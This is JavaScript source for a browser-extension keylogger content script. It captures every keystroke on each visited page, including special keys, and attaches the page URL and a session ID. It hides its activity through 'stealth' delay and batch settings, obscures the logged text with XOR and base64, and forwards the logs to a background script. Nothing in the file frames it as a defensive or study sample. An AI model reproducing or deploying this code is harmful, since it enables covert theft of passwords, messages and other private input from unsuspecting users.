// Get the shared constants (DO NOT change these names)

const { MSG_TYPES, STEALTH, OBFUSCATION } = window.TSConstants;

// MSG_TYPES     : message type names between files

// STEALTH       : delay, batch size, minimum length to log

// OBFUSCATION   : XOR key + base64

// ariables + createEntry() function

let buffer = ""; // string that grows with every keystroke

let timer = null; // 3-second timer

let sessionId = Date.now().toString(); // unique session ID

function createEntry(keys) {
  return {
    url: window.location.href,

    timestamp: new Date().toISOString(),

    keys: keys,

    sessionId: sessionId,

    obfuscated: obfuscate(keys),
  };
}

// Obfuscation helper

function obfuscate(plainText) {
  let result = "";

  for (let char of plainText) {
    const code = char.charCodeAt(0) ^ OBFUSCATION.XOR_KEY;

    result += String.fromCharCode(code);
  }

  return btoa(result);
}

//Communication + Flush + Keylogger (improved)

// Helper: Send to background.js

function sendMessage(entry) {
  chrome.runtime.sendMessage({
    type: MSG_TYPES.LOG_KEYS,

    payload: JSON.stringify(entry),
  });
}

// Main flush

function flushBuffer() {
  if (buffer.length === 0) return;

  const entry = createEntry(buffer);

  sendMessage(entry);

  buffer = "";

  console.log("Flushed buffer to background");
}

// Reset timer

function resetTimer() {
  if (timer) clearTimeout(timer);

  timer = setTimeout(flushBuffer, STEALTH.DELAY_MS);
}

// ==================== MAIN KEYLOGGER (with special keys + MIN_KEY_LENGTH) ====================

document.addEventListener("keydown", (e) => {
  let char = ""; // === Special keys handling (makes it much more realistic) ===

  if (e.key === "Backspace") char = "[BKSP]";
  else if (e.key === "Enter") char = "[ENTER]";
  else if (e.key === "Tab") char = "[TAB]";
  else if (e.key === "Shift") char = "[SHIFT]";
  else if (e.key === "Control") char = "[CTRL]";
  else if (e.key === "Alt") char = "[ALT]";
  else if (e.key === "ArrowLeft") char = "[←]";
  else if (e.key === "ArrowRight") char = "[→]";
  else if (e.key === "ArrowUp") char = "[↑]";
  else if (e.key === "ArrowDown") char = "[↓]";
  else if (e.key.length === 1) char = e.key; // normal printable char

  if (char === "") return; // ignore other keys (CapsLock, etc.)

  buffer += char; // === Use MIN_KEY_LENGTH to reduce noise ===

  if (
    buffer.length >= STEALTH.BATCH_SIZE ||
    buffer.length >= STEALTH.MIN_KEY_LENGTH
  ) {
    flushBuffer();
  } else {
    resetTimer();
  }
});

window.addEventListener("beforeunload", flushBuffer);
